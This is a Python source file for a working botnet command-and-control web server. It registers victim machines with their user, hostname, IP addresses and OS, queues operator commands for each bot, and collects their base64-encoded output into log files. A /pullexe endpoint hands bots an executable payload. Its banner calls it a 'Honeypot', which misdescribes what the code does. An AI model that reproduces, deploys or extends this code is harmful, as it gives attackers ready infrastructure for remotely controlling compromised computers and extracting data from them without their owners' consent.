#!/usr/bin/python3

import base64
import datetime
import time
from random import randint
from http.server import HTTPServer, BaseHTTPRequestHandler


class bots():
	def __init__(self):
		self.botName = []

	def addBot(self, name):
		self.botName.append(name)
		return self

	def removeBot(self, name):
		self.botName.remove(name)
		return self



class bot:
	def __init__(self, name, user, hostname, ipList, os, dateAdded):
		self.name = name	# BotName
		self.notes = ""
		self.ipAddr = ""
		self.user = user
		self.hostname= hostname
		self.ipList = ipList
		self.os = os
		self.dateAdded = dateAdded	# When the bot was added
		self.dateLast = dateAdded	# When the bot last communicated
		self.commandid = 0		# Random integer to follow the command
		self.command = ""		# The command to be executed



class history():
	def __init__(self):
		self.Notes = []

	def addNote(self, name):
		self.Notes.append(name)
		return self

	def removeNote(self, name):
		self.Notes.remove(name)
		return self



class record:
	def __init__(self, botName, commandid, command, results):
		self.botName = botName
		self.commandid = commandid
		self.command = command
		self.results = results
		now = datetime.datetime.now()
		logtime = now.strftime("%m-%d-%Y %H:%M")
		self.dateAdded = logtime



def registerBot(pInfo):
	global listBots
	botInfo = str(base64.b64decode(pInfo))
	params = botInfo.split('&')
	user = params[0].split("=")
	hostName = params[1].split("=")
	ipList = params[2].split("=")
	os = params[3].split("=")
	botNameList = params[4].split("=")
	botName = botNameList[1]
	botName = botName[:-1]
	now = datetime.datetime.now()
	logtime = now.strftime("%m-%d-%Y %H:%M")
	listBots.addBot(bot(botName, user[1], hostName[1], ipList[1], os[1], logtime))
	return

def gatherBotInfo(sPath):
	# http://<ip address>/gather
	global listBots
	botInfo = ""
	for thebots in listBots.botName:
		botInfo += thebots.name + "|"
		botInfo += thebots.notes + "|"
		botInfo += thebots.ipAddr + "|"
		botInfo += thebots.user + "|"
		botInfo += thebots.hostname + "|"
		botInfo += thebots.ipList.replace("|",",") + "|"
		botInfo += thebots.os + "|"
		botInfo += thebots.dateAdded + "|"	# When the bot was added
		botInfo += thebots.dateLast + "|"	# When the bot last communicated
		botInfo += thebots.command + "|"		# The command to be executed
		botInfo += "\r\n"
	return botInfo


def sendCommand(sPath):
	# The controller sends a command to the web server and it is stored until
	# executed...
	global listBots
	#Old - http://<ip address>/send?botName=<botId>&command=<command>
	# http://<ip address>/send?botName=<botId>&cID=<commandID>&command=<command>
	botParams = sPath.split('&')
	botNameInfo = botParams[0].split('=')
	requestBotName = botNameInfo[1]
	commandID = botParams[1].split('=')
	requestCommandID = commandID[1]
	commandInfo = botParams[2].split('=')
	requestCommand = commandInfo[1]
	logtime = ""
	for thebots in listBots.botName:
		if thebots.name == requestBotName:
			now = datetime.datetime.now()
			logtime = now.strftime("%m-%d-%Y %H:%M")
			thebots.dateLast = logtime
			thebots.command = requestCommand
			thebots.commandid = requestCommandID
			infoSend = requestBotName + " "
			infoSend += requestCommand + " " 
			infoSend += logtime + "\n"
			return infoSend
	return "Unable to find botID!"		


def getCommand(sPath):
	# The bot reaches back to the web server to get the command
	# that it needs to execute...
	global listBots
	botInfo = sPath.split('=')
	requestBotName = botInfo[1]
	for thebots in listBots.botName:
		if thebots.name == requestBotName:
			now = datetime.datetime.now()
			logtime = now.strftime("%m-%d-%Y %H:%M")
			thebots.dateLast = logtime
			if thebots.command == "":
				return ""
			else:
				botInfo = thebots.name + " " + thebots.dateLast 
				#commandid = into(time.time())
				botInfo += " " + thebots.commandid
				botInfo += " " + thebots.command
				#print(botInfo)
				botInfo += "\n"
				f = open("botCommands.log", "a")
				f.write(botInfo)
				f.close()
				executeCommand = thebots.commandid + "|" + thebots.command
				thebots.command = ""
				return executeCommand
	return ""

def savePost(pInfo):
	# This function takes what the bot sends back through a post and saves
	# the information...
	global listBots, historyBots
	savedOutput = pInfo.split('&')
	commandInfo = savedOutput[0] 
	command = commandInfo.split('=')
	c = command[1]
	c = c[1:-1]
	commandIDInfo = savedOutput[1]
	commandID = commandIDInfo.split('=')
	cID = commandID[1]
	cID = cID[1:-1]
	botNameInfo = savedOutput[2]
	botName = botNameInfo.split('=')
	b = botName[1]
	b = b[1:-1]
	b64Saved = savedOutput[3]
	b64Results = b64Saved.split("'") # Can not split on = because of base64 having an equals at the end
	b64 = b64Results[1]
	savedOutput = base64.b64decode(b64)
	savedOutput = savedOutput.decode('ascii')
	#print(savedOutput)
	f = open("botOutput.log", "a")
	f.write(savedOutput)
	f.write("\n\n");
	f.close()
	#commandID = randint(100000,999999)
	historyBots.addNote(record(b, cID, c, b64))
	return



def servePage(s, hverb):
	global postMessage
	global listBots, historyBots
	message = ""
	now = datetime.datetime.now()
	logtime = now.strftime("%m-%d-%Y %H:%M")
	userAgent = str(s.headers['User-Agent'])
	if hverb == "POST":
		contentLen = int(s.headers['Content-Length'])
		body = s.rfile.read(contentLen)
		postInfo = body.decode("utf-8")
		if "message" in postInfo:
			postMessage = postInfo
	else:
		postInfo = ""
	log = logtime
	log += " SrcIP:" + s.client_address[0]
	log += " HTTPCode:200"
	log += " HTTPVerb:" + hverb
	log += " URI:" + s.path
	log += " UserAgent:" + userAgent
	log += " Headers("
	for h in s.headers:
		if "User-Agent" not in h:
			log += h + ":" + s.headers[h] + ","
	log = log[:-1]
	log += ")"
	if hverb == "POST":
		log += " POST:" + postInfo
	log += "\n"
	f = open('log.txt', 'a')
	f.write(log)
	f.close()
	s.send_response(200)
	s.send_header('Content-type', 'text/html')
	s.end_headers()
	if '/get?botName=' in s.path:
		message = getCommand(s.path)
	elif s.path == '/register' and hverb == "POST":
		registerBot(postInfo)
		message = ""
	elif s.path == '/post' and hverb == "POST":
		savePost(postInfo)
		message = "a"
	elif s.path == '/gather':
		message = gatherBotInfo(s.path)
	elif '/send?botName=' in s.path and '&command=' in s.path:
		message = sendCommand(s.path)
	elif '/send' in s.path:
		message = "http://<ip address>/send?botName=<botId>&command=<command>" + "\n"
	elif '/pullexe' in s.path:
		f = open('exe_y2', 'r')
		for line in f:
			message += line
		f.close()
	else:
		message = ""
	s.wfile.write(bytes(message, "utf8"))
	return



class StaticServer(BaseHTTPRequestHandler):

	def do_GET(self):
		servePage(self, "GET")
		return

	def do_POST(self):
		servePage(self, "POST")
		return

	def do_PUT(self):
		servePage(self, "PUT")
		return

	def do_DELETE(self):
		servePage(self, "DELETE")
		return

	def do_OPTIONS(self):
		servePage(self, "OPTIONS")
		return



# You can change the port it listens on below...
def main(server_class=HTTPServer, handler_class=StaticServer, port=8001):
	global listBots, historyBots
	server_address = ('', port)
	httpd = server_class(server_address, handler_class)
	print('Starting httpd on port {}'.format(port))
	# For testing purposes below...
	historyBots.addNote(record("testBot1", 543455, "test", "dGVzdA=="))
	historyBots.addNote(record("testBot1", 237645, "test", "dGVzdA=="))
	historyBots.addNote(record("testBot2", 167908, "test", "dGVzdA=="))
	now = datetime.datetime.now()
	logtime = now.strftime("%m-%d-%Y %H:%M")
	#listBots.addBot(bot("testBot1", "test", "botTest1", "172.16.5.5|192.168.23.5", "Linux", logtime))
	#listBots.addBot(bot("testBot2", "test", "botTest2", "172.16.5.5|192.168.23.5", "Linux", logtime))
	httpd.serve_forever()




postMessage=""
listBots = bots()
historyBots = history()
print("http.server Honeypot")
main()

